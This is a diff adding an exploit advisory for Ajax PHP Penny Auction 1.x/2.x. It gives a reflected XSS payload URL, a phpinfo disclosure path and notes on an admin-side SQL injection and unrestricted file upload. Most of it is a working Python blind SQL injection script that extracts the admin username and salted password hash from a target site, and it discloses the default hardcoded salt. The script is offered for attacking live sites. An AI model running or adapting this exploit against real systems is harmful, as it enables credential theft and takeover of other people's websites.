@@ -1,0 +1,180 @@
+################################################################################
+#          Ajax PHP Penny Auction 1.x 2.x multiple Vulnerabilities             #
+#                       Found by : Taha Hunter                                 #
+#Info :                                                                		   #
+#     Ajax PHP Penny Auction is one of the most proven and reliable            #
+# Penny Auction software options available on the market. Based on a           #
+#  proprietary AJAX Streaming Engine which has four years of                   #
+#   refinement and debugging under its belt in real live site action.          #
+#              	                                                               #
+#																			   #
+#           website : http://www.ajaxphppennyauction.com/                      #
+################################################################################
+
+XSS : 
+
+http://[target]/forgotpasswd.php/"onmouseover='alert("XSS")'">
+
+Phpinfo Information Disclosure :
+
+http://[target]/phpinfo.php
+
+Blind SQL Injection :
+
+#!/usr/bin/pyhon
+################################################################################
+#																			   #
+#	         Ajax PHP Penny Auction version 1.x 2.x maybe oders                #
+#                  item.php Blind SQL Injection Exploit   	                   #
+#		if you can not beat autoclickers bots ==> hack them ;)	   			   #
+#					Found & Coded by : Taha Hunter							   #
+#				By default there is a table suffix called					   #
+#	  PHPAUCTIONXL_ added to all table names you can remove it if its needed   #
+#		The Password is like  form md5($salt.$password)          			   #
+#  the salt is hardcoded in /includes/config.inc.php by default its value is   #
+#    $MD5_PREFIX = "This_Is_My_Random_String_For_The_MD5_Hash_Algorithm";      #
+#																			   #
+#File Upload :											    				   #
+#if you get the admin password you can upload arbitrary files from 		       #
+#http://[target]/admin/homepage.php there is no check for file extention	   #
+#																			   #
+#MySQL Integer SQLi :	                                                       #
+#http://[target]/admin/userbidhistoryauctions.php?id=65'					   #
+#you must first be logged as admin probably more vulnerablities still there..  #
+#																			   #
+#																		       #
+# Usage : python ajaxphpa.py -u http://www.target.com/item.php?id=[a valid id] #
+#																		       #
+#																		       #
+# 		Greetz to : Mehdi,Esac,Issam,Ali,Haitam,Imad and all friends ;)        #
+#																		       #
+#																		       #
+#					Contact me : vastmerdown@gmail.com	        		       #
+#																		       #
+################################################################################
+
+
+import urllib2
+from threading import Thread
+from time import sleep
+from optparse import OptionParser
+print "#######################################################################"
+print "#                                                                     #"
+print "#      Ajax PHP Penny Auction 1.x 2.x Blind SQL Injection Exploit     #"
+print "#                                                                     #"
+print "#             Found & Coded by : Taha Hunter                          #"
+print "#                                                                     #"
+print "#           Contact me : vastmerdown@gmail.com                        #"
+print "#                                                                     #"
+print "#python ajaxphpa.py -u http://www.target.com/item.php?id=[a valid id] #"
+print "#                                                                     #"
+print "#######################################################################"
+print ""
+print ""
+name = ""
+admin_user = ""
+admin_password = ""
+strinng=[]
+def valid_test(url,type,val,sig):
+	yep = urllib2.urlopen(url+type+sig+str(val)).read()
+	if keyword in yep:
+		return 1
+	else:
+		return 0
+
+def start_guessing(url,type,guess_type):
+		total = 0
+		n_guess = 0
+		fixer = 0
+		max = 255
+		string =""
+		guess = int(max)/2
+		while(total != 9):
+			if(valid_test(url, type,guess, '>')):	
+				fixer = guess
+				n_guess = int(guess + ((max - fixer)/2))
+			if(valid_test(url,type, guess, '<')):
+				max = guess
+				n_guess = int(guess - ((max - fixer)/2))
+	 
+			if(valid_test(url, type,guess, '=')):
+				if guess_type == 'len':
+					return guess
+				if guess_type == 'ascii':
+					return chr(guess)
+			guess = n_guess
+			total += 1
+def loader(id,strinng,url,type,guess_type,lenn):
+	strinng[id] =start_guessing(url,type,guess_type)
+keyword = "item_watch.php?add="
+db_len = "%20and%20Length((database()))"
+usage = 'usage: %prog -u http://[target]/item.php?id=[a valid id]'
+parser = OptionParser(usage=usage)
+parser.add_option("-u", action="store", type="string", dest="url1", help='"http://[target]/item.php?id=1080"')
+(options, args) = parser.parse_args()
+if(options.url1):
+	url = options.url1
+else:
+	print "[-] Please insert a valid URL !"
+	exit()
+print "[+] Connecting to site"
+req = urllib2.urlopen(url).read()
+if not keyword in req:
+	print "[-] Please use a valide ID for the link !"
+	exit()
+''' #If you want to know DB Name
+print "[+] Finding Database Name Length"
+lenn = start_guessing(url,db_len,'len')
+print "[+] DB length is ==> "+str(lenn)
+print "[+] Finding Database Name"
+for a in range(lenn):
+		strinng.append('1337')
+for i in range(1,lenn+1):
+	db_name ="%20and%20ascii(substring((database())%2C"+str(i)+"%2C1))"
+	Thread(target=loader,args=[i-1,strinng,url,db_name,'ascii',lenn]).start()
+while '1337' in strinng:
+	sleep(3)
+	#print strinng #incomment this line if you want to see progression 
+	continue
+for i in range(len(strinng)):
+	name += strinng[i]
+print "[+] Database Name is ==> " + name
+'''
+un_len = "%20and%20Length((select%20username%20from%20PHPAUCTIONXL_adminusers%20limit%200%2C1))"
+pass_len ="%20and%20Length((select%20password%20from%20PHPAUCTIONXL_adminusers%20limit%200%2C1))"
+print "[+] Finding Username Length may take a while..."
+lenn = start_guessing(url,un_len,'len')
+print "[+] Done ."
+del strinng[:]
+for a in range(lenn):
+		strinng.append('1337')
+print "[+] Extracting Username may take a while..."
+for i in range(1,lenn+1):
+	username = "%20and%20ascii(substring((select%20username%20from%20PHPAUCTIONXL_adminusers%20limit%200%2C1)%2C"+str(i)+"%2C1))"
+	Thread(target=loader,args=[i-1,strinng,url,username,'ascii',lenn]).start()
+while '1337' in strinng:
+	sleep(3)
+	#print strinng # incomment this line if you want to see progression 
+	continue
+for i in range(len(strinng)):
+	admin_user += strinng[i]
+print "[+] Found ! Username is ==> " +admin_user
+print "[+] Finding Password Length may take a while..."
+lenn = start_guessing(url,pass_len,'len')
+print "[+] Done ."
+del strinng[:]
+for a in range(lenn):
+		strinng.append('1337')
+print "[+] Extracting Password may take a while..."
+for i in range(1,lenn+1):
+	password = "%20and%20ascii(substring((select%20password%20from%20PHPAUCTIONXL_adminusers%20limit%200%2C1)%2C"+str(i)+"%2C1))"
+	Thread(target=loader,args=[i-1,strinng,url,password,'ascii',lenn]).start()
+while '1337' in strinng:
+	sleep(3)
+	#print strinng #incomment this line if you want to see progression 
+	continue
+for i in range(len(strinng)):
+	admin_password += strinng[i]
+print "[+] Found ! Password is ==> " +admin_password
+print "[+] Username => "+admin_user+" Password : => "+admin_password
+print "[+] Done Enjoy !"
